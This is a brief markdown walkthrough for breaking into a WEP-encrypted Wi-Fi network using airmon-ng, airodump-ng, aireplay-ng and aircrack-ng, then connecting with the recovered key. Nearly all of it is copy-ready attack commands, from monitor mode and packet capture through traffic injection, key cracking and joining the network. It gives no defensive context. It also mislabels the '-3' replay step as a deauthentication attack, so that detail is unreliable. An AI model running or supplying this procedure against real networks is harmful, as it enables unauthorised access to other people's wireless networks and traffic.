### Setup

```bash
sudo airmon-ng check kill
sudo airmon-ng start wlan0
```


### Identify the network

Identify the network by launching an airodump scan:
```bash
sudo airodump-ng wlan0mon
sudo airodump-ng wlan0mon --wps
sudo airodump-ng wlan0mon --band abg --wps --manufacturer
```


### Gather IVs

Use the channel and BSSID from the previous command to dump traffic for the WEP AP.
```bash
sudo airodump-ng wlan0mon -c <channel> --bssid <BSSID> -w WEP 
```

Launch a deauthentication attack to create more network traffic, enter the channel and BSSID for the AP. Lastly use a valid MAC from one of the interfaces (wlan1 was used here). Around 10k packets are required before we can proceed to the next step:
```bash
sudo aireplay-ng -3 -b <BSSID> -h <MAC> wlan0mon

# E.g.
sudo aireplay-ng -3 -b F0:9F:C2:71:22:11 -h 02:00:00:00:01:00 wlan0mon
```


### Crack key

Use the cap file to crack the WEP key:
```bash
aircrack-ng WEP-01.cap
```


### Connect to the network

Start the NetworkManager service:
```bash
sudo service NetworkManager start
```

Set the interface up:
```bash
sudo ifconfig wlan1 up
```

Create the configuration file to connect to the network: `connect.config`
```bash
network={
  ssid="<ESSID>"
  key_mgmt=NONE
  # E.g. wep_key0=11BB33CD55
  wep_key0=<KEY>
  wep_tx_keyidx=0
}
```
>[!warning]
>Remove `:` when entering a hex key, use `""` when specifying an ASCII password

Use the configuration file to connect to the network:
```bash
sudo wpa_supplicant -i wlan1 -c connect.config
```

Obtain DHCP address:
```bash
sudo dhclient wlan1
```
